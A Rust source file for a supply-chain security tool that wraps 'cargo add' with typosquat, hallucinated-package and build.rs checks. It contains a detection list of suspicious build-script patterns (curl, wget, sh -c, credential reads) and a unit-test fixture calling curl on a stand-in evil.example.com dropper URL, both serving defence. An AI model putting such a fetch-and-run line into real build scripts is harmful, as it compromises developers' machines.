//! `greengate cargo-add` — Zero-Trust cargo-add wrapper.
//!
//! **Layer 1 — Pre-flight typosquat check**
//! Crate names are compared against the 60 most-downloaded crates.io crates
//! using Levenshtein distance.  Any name within edit-distance 2 of a popular
//! crate (but not identical) is flagged before the install proceeds.
//!
//! **Layer 2 — build.rs static analysis (post-add)**
//! After `cargo add` updates `Cargo.toml`, `cargo fetch` is run to download
//! the new crates.  For each newly added crate, the `build.rs` in the cargo
//! registry cache (`~/.cargo/registry/src/`) is located and scanned for
//! suspicious patterns: network access, process spawning, filesystem writes
//! to unexpected locations, and high Shannon entropy.
//!
//! **Layer 3 — Dependency explosion guard**
//! After the add, the transitive dependency count in `Cargo.lock` is compared
//! to the pre-add count.  A single new crate that adds > 50 transitive deps
//! is flagged for manual review (common indicator of over-bundled or suspicious
//! crates).

use crate::utils::terminal;
use anyhow::Result;
use std::collections::HashSet;
use std::path::{Path, PathBuf};

// ── Public API ────────────────────────────────────────────────────────────────

pub struct CargoAddOpts {
    /// Arguments forwarded verbatim to `cargo add`
    pub args: Vec<String>,
    /// Exit non-zero on any finding (default: true)
    pub no_fail: bool,
    /// Crate names whose findings are reported as warnings only
    pub allow_crates: Vec<String>,
    /// Run the slopsquat / hallucinated-package guard (registry-metadata check)
    pub slopsquat_check: bool,
    /// Age threshold (days) below which a newly-introduced crate is suspicious
    pub slopsquat_min_age_days: u64,
    /// Download threshold below which a newly-introduced crate is suspicious
    pub slopsquat_min_downloads: u64,
    /// Internal package patterns for the dependency-confusion check
    pub internal_packages: Vec<String>,
}

// ── Popular crates.io packages for typosquat detection ───────────────────────

/// The 60 most-downloaded crates.io packages used as the typosquat reference.
const CARGO_POPULAR: &[&str] = &[
    "serde",
    "tokio",
    "rand",
    "regex",
    "clap",
    "anyhow",
    "thiserror",
    "tracing",
    "log",
    "env_logger",
    "reqwest",
    "hyper",
    "axum",
    "actix-web",
    "rocket",
    "sqlx",
    "diesel",
    "rusqlite",
    "serde_json",
    "serde_yaml",
    "chrono",
    "time",
    "url",
    "uuid",
    "once_cell",
    "lazy_static",
    "itertools",
    "rayon",
    "crossbeam",
    "parking_lot",
    "bytes",
    "futures",
    "async-std",
    "smol",
    "criterion",
    "proptest",
    "nom",
    "pest",
    "winnow",
    "zip",
    "tar",
    "flate2",
    "hex",
    "base64",
    "ring",
    "rustls",
    "openssl",
    "toml",
    "indexmap",
    "ahash",
    "dashmap",
    "strum",
    "bitflags",
    "num",
    "libc",
    "nix",
    "mio",
    "prost",
    "tonic",
    "wasm-bindgen",
];

// ── Suspicious build.rs patterns ─────────────────────────────────────────────

/// (signal_name, substring) pairs checked in every build.rs file.
const BUILD_RS_SIGNALS: &[(&str, &str)] = &[
    // Network access
    ("TcpStream::connect", "TcpStream::connect"),
    ("UdpSocket::bind", "UdpSocket::bind"),
    ("reqwest", "reqwest"),
    ("ureq", "ureq::"),
    ("attohttpc", "attohttpc"),
    ("minreq", "minreq"),
    // Dynamic code execution
    ("Command::new", "Command::new"),
    ("process::Command", "process::Command"),
    ("std::process::Command", "std::process::Command"),
    // Filesystem writes outside build dir
    ("fs::write", "fs::write("),
    ("File::create", "File::create("),
    ("OpenOptions::new", "OpenOptions::new()"),
    // Credential exfiltration
    ("env::var", "env::var("),
    ("env::vars()", "env::vars()"),
    ("std::env::var", "std::env::var("),
    // Shell/script execution
    ("sh -c", "sh -c"),
    ("bash -c", "bash -c"),
    ("powershell", "powershell"),
    ("curl ", "curl "),
    ("wget ", "wget "),
    // Base64 / obfuscation
    ("base64::decode", "base64::decode"),
    ("from_utf8_unchecked", "from_utf8_unchecked"),
    // Dynamic loading
    ("libloading", "libloading"),
    ("dlopen", "dlopen("),
];

// ── Entry point ───────────────────────────────────────────────────────────────

pub fn run_cargo_add(opts: CargoAddOpts) -> Result<()> {
    terminal::info(&format!(
        "Zero-Trust Supply Chain Gate (cargo): intercepting `cargo add {}`",
        opts.args.join(" ")
    ));

    // ── Layer 1: Typosquat pre-flight ─────────────────────────────────────────
    let crates_to_add = extract_crate_names(&opts.args);
    let mut typosquats: Vec<(String, String)> = Vec::new();
    for krate in &crates_to_add {
        if let Some(candidate) = check_typosquat(krate) {
            typosquats.push((krate.clone(), candidate));
        }
    }
    if !typosquats.is_empty() {
        eprintln!();
        eprintln!(
            "⚠️  Zero-Trust Supply Chain Gate (cargo): {} potential typosquat(s) detected:",
            typosquats.len()
        );
        eprintln!();
        for (requested, closest) in &typosquats {
            eprintln!(
                "  [TYPOSQUAT] '{}' is suspiciously close to popular crate '{}'",
                requested, closest
            );
        }
        eprintln!();
        eprintln!("  Verify the exact crate name at https://crates.io before adding.");
        eprintln!();

        let blocking = typosquats
            .iter()
            .filter(|(krate, _)| !is_allowlisted(krate, &opts.allow_crates))
            .count();
        if blocking > 0 && !opts.no_fail {
            return Err(anyhow::anyhow!(
                "Zero-Trust Supply Chain Gate (cargo): {} potential typosquat(s) — halting before add.",
                blocking
            ));
        }
    }

    // ── Layer 1.5: Slopsquat / hallucinated-package guard ─────────────────────
    // Typosquat catches names *close to* a popular crate; a hallucinated name is
    // often novel, so we also score registry metadata (age, downloads, existence)
    // of any crate not already pinned in Cargo.lock.
    if opts.slopsquat_check {
        use crate::modules::slopsquat::{self, Ecosystem};
        let policy = slopsquat::GuardPolicy {
            slop: slopsquat::SlopConfig {
                min_age_days: opts.slopsquat_min_age_days,
                min_downloads: opts.slopsquat_min_downloads,
            },
            internal_patterns: opts.internal_packages.clone(),
        };
        let names: Vec<String> = crates_to_add
            .iter()
            .map(|k| k.split('@').next().unwrap_or(k).to_string())
            .collect();
        let lock = parse_cargo_lock("Cargo.lock");
        let in_lock = |name: &str| lock.iter().any(|e| e.split(' ').next() == Some(name));
        let reports = slopsquat::guard(
            Ecosystem::Cargo,
            &names,
            &opts.allow_crates,
            &in_lock,
            &policy,
        );
        let blocking = slopsquat::print_reports(Ecosystem::Cargo, &reports);
        if blocking > 0 && !opts.no_fail {
            return Err(anyhow::anyhow!(
                "Zero-Trust Supply Chain Gate (cargo): {blocking} high-suspicion slopsquat(s) — halting before add."
            ));
        }
    }

    // ── Pre-add Cargo.lock snapshot ───────────────────────────────────────────
    let pre_lock_crates = parse_cargo_lock("Cargo.lock");

    // ── Run cargo add ─────────────────────────────────────────────────────────
    let status = std::process::Command::new("cargo") // greengate: ignore — intentionally wrapping cargo to intercept the add
        .arg("add")
        .args(&opts.args)
        .status();

    match &status {
        Err(e) => {
            return Err(anyhow::anyhow!(
                "Failed to launch `cargo add`: {}. Is cargo installed?",
                e
            ));
        }
        Ok(s) if !s.success() => {
            return Err(anyhow::anyhow!(
                "`cargo add` failed ({s}) — Cargo.toml was not updated."
            ));
        }
        _ => {}
    }

    let _ = std::process::Command::new("cargo") // greengate: ignore — fetching registry sources after add
        .args(["fetch", "--quiet"])
        .status();

    // ── Layer 3: Dependency explosion guard ───────────────────────────────────
    let post_lock_crates = parse_cargo_lock("Cargo.lock");
    let new_crates: Vec<String> = post_lock_crates
        .difference(&pre_lock_crates)
        .cloned()
        .collect();

    let transitive_count = new_crates.len().saturating_sub(crates_to_add.len());
    if transitive_count > 50 {
        eprintln!();
        eprintln!(
            "⚠️  Zero-Trust Supply Chain Gate (cargo): adding {} crate(s) pulled in {} transitive \
             dependencies — review the full dependency tree with `cargo tree`.",
            crates_to_add.len(),
            transitive_count
        );
        eprintln!();
    }

    // ── Layer 2: build.rs static analysis ────────────────────────────────────
    let registry_src = locate_cargo_registry_src();
    let mut build_threats: Vec<BuildRsThreat> = Vec::new();

    for crate_name in &new_crates {
        // Crate names in the lock file may include version: "serde 1.0.197"
        let name_only = crate_name.split_whitespace().next().unwrap_or(crate_name);
        if let Some(build_rs) = find_build_rs(&registry_src, name_only)
            && let Ok(src) = std::fs::read_to_string(&build_rs)
        {
            let signals = scan_build_rs_signals(&src);
            let max_entropy = max_entropy_score(&src);
            const ENTROPY_THRESHOLD: f64 = 4.8;
            if !signals.is_empty() || max_entropy > ENTROPY_THRESHOLD {
                build_threats.push(BuildRsThreat {
                    krate: name_only.to_string(),
                    path: build_rs,
                    signals,
                    max_entropy,
                });
            }
        }
    }

    // ── Report ─────────────────────────────────────────────────────────────────
    let mut any_blocking = false;

    if !build_threats.is_empty() {
        eprintln!();
        eprintln!(
            "⚠️  Zero-Trust Supply Chain Gate (cargo): {} crate(s) with suspicious build.rs:",
            build_threats.len()
        );
        eprintln!();
        for t in &build_threats {
            let allowed = is_allowlisted(&t.krate, &opts.allow_crates);
            let tag = if allowed { " [allowlisted]" } else { "" };
            eprintln!("  [BUILD_RS] {} — {}{}", t.krate, t.path.display(), tag);
            if !t.signals.is_empty() {
                eprintln!("    Signals  : {}", t.signals.join(", "));
            }
            if t.max_entropy > 4.8 {
                eprintln!(
                    "    Entropy  : {:.2}  (threshold 4.80 — likely obfuscated)",
                    t.max_entropy
                );
            }
            if !allowed {
                any_blocking = true;
            }
        }
        eprintln!();
        eprintln!(
            "  Tip: review the build.rs manually — build scripts run arbitrary code at \
             compile time with full OS access.\n  \
             Add the crate to [supply_chain] allow_cargo_crates to suppress."
        );
        eprintln!();
    }

    if any_blocking && !opts.no_fail {
        return Err(anyhow::anyhow!(
            "Zero-Trust Supply Chain Gate (cargo): blocking build.rs finding(s) detected."
        ));
    }

    if typosquats.is_empty() && build_threats.is_empty() {
        terminal::success(
            "Zero-Trust Supply Chain Gate (cargo): clean — no typosquats or suspicious \
             build scripts detected.",
        );
    }

    Ok(())
}

// ── Internal types ────────────────────────────────────────────────────────────

struct BuildRsThreat {
    krate: String,
    path: PathBuf,
    signals: Vec<String>,
    max_entropy: f64,
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Extract crate names from `cargo add` args (strip feature flags and version specs).
fn extract_crate_names(args: &[String]) -> Vec<String> {
    let mut names = Vec::new();
    let mut skip_next = false;
    for arg in args {
        if skip_next {
            skip_next = false;
            continue;
        }
        // skip flags that take a value
        if matches!(
            arg.as_str(),
            "--features"
                | "-F"
                | "--rename"
                | "--manifest-path"
                | "--target"
                | "--branch"
                | "--tag"
                | "--rev"
                | "--git"
                | "--path"
                | "--registry"
                | "-p"
                | "--package"
        ) {
            skip_next = true;
            continue;
        }
        if arg.starts_with('-') {
            continue;
        }
        // Strip version spec: serde@1.0 → serde
        let name = arg.split('@').next().unwrap_or(arg).trim().to_lowercase();
        if !name.is_empty() {
            names.push(name);
        }
    }
    names
}

/// Returns the closest popular crate name if `krate` looks like a typosquat.
fn check_typosquat(krate: &str) -> Option<String> {
    let norm = krate.to_lowercase().replace('-', "_");
    for &popular in CARGO_POPULAR {
        let pop_norm = popular.to_lowercase().replace('-', "_");
        if norm == pop_norm {
            return None;
        }
        if norm.len() < 4 || pop_norm.len() < 4 {
            continue;
        }
        let dist = levenshtein(&norm, &pop_norm);
        if dist <= 2 {
            return Some(popular.to_string());
        }
    }
    None
}

/// Parse crate names+versions from a Cargo.lock file (TOML v3 format).
/// Returns a set of "name version" strings, e.g. `{"serde 1.0.197"}`.
fn parse_cargo_lock(path: &str) -> HashSet<String> {
    let mut set = HashSet::new();
    let Ok(content) = std::fs::read_to_string(path) else {
        return set;
    };

    // Cargo.lock v3 has `[[package]]` sections with `name = "..."` and `version = "..."`.
    let mut current_name: Option<String> = None;
    let mut current_version: Option<String> = None;

    for line in content.lines() {
        let line = line.trim();
        if line == "[[package]]" {
            if let (Some(n), Some(v)) = (current_name.take(), current_version.take()) {
                set.insert(format!("{} {}", n, v));
            }
        } else if let Some(rest) = line.strip_prefix("name = ") {
            current_name = Some(rest.trim_matches('"').to_string());
        } else if let Some(rest) = line.strip_prefix("version = ") {
            current_version = Some(rest.trim_matches('"').to_string());
        }
    }
    // Flush last package
    if let (Some(n), Some(v)) = (current_name, current_version) {
        set.insert(format!("{} {}", n, v));
    }
    set
}

/// Locate the cargo registry source cache directory.
/// Typically `~/.cargo/registry/src/`.
fn locate_cargo_registry_src() -> PathBuf {
    // Prefer CARGO_HOME env var
    if let Ok(cargo_home) = std::env::var("CARGO_HOME") {
        let p = PathBuf::from(cargo_home).join("registry").join("src");
        if p.is_dir() {
            return p;
        }
    }
    // Fallback to ~/.cargo
    if let Some(home) = home_dir() {
        let p = home.join(".cargo").join("registry").join("src");
        if p.is_dir() {
            return p;
        }
    }
    PathBuf::from(".cargo/registry/src")
}

/// Find the `build.rs` for `crate_name` anywhere under the registry src dir.
fn find_build_rs(registry_src: &Path, crate_name: &str) -> Option<PathBuf> {
    // Registry layout: registry_src/<mirror-hash>/<crate_name>-<version>/build.rs
    let Ok(mirrors) = std::fs::read_dir(registry_src) else {
        return None;
    };
    for mirror in mirrors.flatten() {
        let mirror_path = mirror.path();
        if !mirror_path.is_dir() {
            continue;
        }
        let Ok(crate_dirs) = std::fs::read_dir(&mirror_path) else {
            continue;
        };
        for crate_dir in crate_dirs.flatten() {
            let dir_name = crate_dir.file_name().to_string_lossy().to_lowercase();
            // Match "<crate_name>-<version>" prefix
            let prefix = format!("{}-", crate_name.to_lowercase().replace('-', "_"));
            let dir_norm = dir_name.replace('-', "_");
            if dir_norm.starts_with(&prefix) || dir_norm == crate_name.replace('-', "_") {
                let build_rs = crate_dir.path().join("build.rs");
                if build_rs.exists() {
                    return Some(build_rs);
                }
            }
        }
    }
    None
}

fn scan_build_rs_signals(source: &str) -> Vec<String> {
    BUILD_RS_SIGNALS
        .iter()
        .filter(|(_, needle)| source.contains(needle))
        .map(|(name, _)| name.to_string())
        .collect()
}

fn max_entropy_score(text: &str) -> f64 {
    const WINDOW: usize = 64;
    let bytes = text.as_bytes();
    if bytes.len() < 32 {
        return 0.0;
    }
    let mut max = 0.0_f64;
    let end = bytes.len().saturating_sub(WINDOW - 1);
    for start in 0..end {
        let window = &bytes[start..start + WINDOW];
        let mut freq = [0u32; 256];
        for &b in window {
            freq[b as usize] += 1;
        }
        let entropy: f64 = freq
            .iter()
            .filter(|&&c| c > 0)
            .map(|&c| {
                let p = c as f64 / WINDOW as f64;
                -p * p.log2()
            })
            .sum();
        if entropy > max {
            max = entropy;
        }
    }
    max
}

fn is_allowlisted(krate: &str, allowlist: &[String]) -> bool {
    allowlist
        .iter()
        .any(|a| a.to_lowercase() == krate.to_lowercase())
}

/// Home directory helper (cross-platform).
fn home_dir() -> Option<PathBuf> {
    std::env::var("HOME")
        .ok()
        .or_else(|| std::env::var("USERPROFILE").ok())
        .map(PathBuf::from)
}

/// Levenshtein edit distance.
#[allow(clippy::needless_range_loop)]
fn levenshtein(a: &str, b: &str) -> usize {
    let a: Vec<char> = a.chars().collect();
    let b: Vec<char> = b.chars().collect();
    let (m, n) = (a.len(), b.len());
    if m == 0 {
        return n;
    }
    if n == 0 {
        return m;
    }
    if m.abs_diff(n) > 3 {
        return m.abs_diff(n);
    }
    let mut dp = vec![vec![0usize; n + 1]; m + 1];
    for i in 0..=m {
        dp[i][0] = i;
    }
    for j in 0..=n {
        dp[0][j] = j;
    }
    for i in 1..=m {
        for j in 1..=n {
            dp[i][j] = if a[i - 1] == b[j - 1] {
                dp[i - 1][j - 1]
            } else {
                1 + dp[i - 1][j - 1].min(dp[i - 1][j]).min(dp[i][j - 1])
            };
        }
    }
    dp[m][n]
}

// ── Unit tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn typosquat_detects_serde_variant() {
        // "serce" is edit-distance 2 from "serde"
        let result = check_typosquat("serce");
        assert_eq!(result.as_deref(), Some("serde"));
    }

    #[test]
    fn typosquat_exact_match_not_flagged() {
        assert!(check_typosquat("serde").is_none());
        assert!(check_typosquat("tokio").is_none());
        assert!(check_typosquat("reqwest").is_none());
    }

    #[test]
    fn typosquat_clearly_different_not_flagged() {
        assert!(check_typosquat("my_totally_unique_crate_xyz").is_none());
    }

    #[test]
    fn typosquat_tokio_variant() {
        // "tokoi" — transposition — edit distance 2
        let result = check_typosquat("tokoi");
        assert_eq!(result.as_deref(), Some("tokio"));
    }

    #[test]
    fn typosquat_hyphen_underscore_normalised() {
        // "actix_web" should not be flagged against "actix-web"
        assert!(check_typosquat("actix_web").is_none());
    }

    #[test]
    fn extract_crate_names_basic() {
        let args: Vec<String> = ["serde", "tokio@1.0", "--features", "full"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let names = extract_crate_names(&args);
        assert_eq!(names, vec!["serde", "tokio"]);
    }

    #[test]
    fn extract_crate_names_skips_flags() {
        let args: Vec<String> = ["--no-default-features", "anyhow", "-F", "backtrace"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let names = extract_crate_names(&args);
        assert_eq!(names, vec!["anyhow"]);
    }

    #[test]
    fn parse_cargo_lock_basic() {
        let lock = r#"
[[package]]
name = "serde"
version = "1.0.197"
source = "registry+https://github.com/rust-lang/crates.io-index"

[[package]]
name = "tokio"
version = "1.37.0"
source = "registry+https://github.com/rust-lang/crates.io-index"
"#;
        let tmp = std::env::temp_dir().join("greengate_test_Cargo.lock");
        std::fs::write(&tmp, lock).unwrap();
        let set = parse_cargo_lock(tmp.to_str().unwrap());
        assert!(set.contains("serde 1.0.197"));
        assert!(set.contains("tokio 1.37.0"));
        std::fs::remove_file(&tmp).ok();
    }

    #[test]
    fn scan_build_rs_detects_command() {
        let src = r#"
fn main() {
    let out = std::process::Command::new("curl")
        .arg("https://evil.example.com/drop.sh")
        .output().unwrap();
}
"#;
        let signals = scan_build_rs_signals(src);
        assert!(signals.iter().any(|s| s.contains("Command")));
    }

    #[test]
    fn scan_build_rs_clean_file_no_signals() {
        let src = r#"
fn main() {
    println!("cargo:rerun-if-changed=build.rs");
}
"#;
        let signals = scan_build_rs_signals(src);
        assert!(signals.is_empty());
    }

    #[test]
    fn levenshtein_identical() {
        assert_eq!(levenshtein("serde", "serde"), 0);
    }

    #[test]
    fn levenshtein_transposition() {
        assert_eq!(levenshtein("tokio", "tokoi"), 2);
    }

    #[test]
    fn allowlist_case_insensitive() {
        let allow = vec!["OpenSSL".to_string()];
        assert!(is_allowlisted("openssl", &allow));
    }
}
